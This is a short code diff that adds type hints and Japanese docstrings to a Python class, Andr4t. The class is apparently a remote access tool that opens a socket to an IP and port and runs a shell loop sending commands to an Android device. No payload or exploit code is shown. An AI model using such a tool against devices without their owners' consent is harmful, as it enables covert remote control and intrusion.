@@ -22,11 +22,24 @@ from command import Command
 
 class Andr4t:
     
-    def __init__(self, ip, port) -> None:
+    def __init__(self, ip: str, port: int) -> None:
+        """
+        コンストラクタ
+
+        Args:
+            ip (str): ipアドレス
+            port (int): ポート番号
+        """
         self.__socket = Socket(ip, port)
         self.__socket.start()
     
     def get_shell(self) -> None:
+        """
+        シェル取得
+        
+        Remarks:
+            このメソッドでAndroid端末にコマンドを送信する
+        """
         print("== shell open == \n")
         while True:
             try:
